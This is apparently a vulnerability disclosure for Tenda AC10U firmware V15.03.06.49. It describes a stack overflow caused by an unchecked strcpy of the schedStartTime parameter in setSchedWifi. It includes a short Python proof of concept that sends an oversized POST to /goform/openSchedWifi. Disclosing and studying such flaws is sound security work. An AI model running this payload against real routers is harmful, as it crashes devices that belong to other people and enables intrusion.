## Overview

- Firmware download website: https://www.tendacn.com/download/detail-3795.html

## Affected version

AC10U v1.0 Firmware V15.03.06.49

## Vulnerability details

The Tenda AC10U v1.0 Firmware V15.03.06.49 firmware has a stack overflow vulnerability in the `setSchedWifi` function. The `sched_start_time` variable receives the `schedStartTime` parameter from a POST request and is later assigned to the `wlan_switch` variable, which is fixed at 25 bytes. However, since the user can control the input of `schedStartTime`, the statement `strcpy(wlan_switch->begin_time, sched_start_time);` can cause a buffer overflow. The user-provided `schedStartTime` can exceed the capacity of the `wlan_switch` array, triggering this security vulnerability.

![image-20240313152429855](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313152429855.png)

![image-20240313152216580](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313152216580.png)

![image-20240313152307874](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313152307874.png)

## PoC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/openSchedWifi"
payload = b"a"*1000

data = {"schedWifiEnable":0,"schedStartTime": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240313152455310](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313152455310.png)
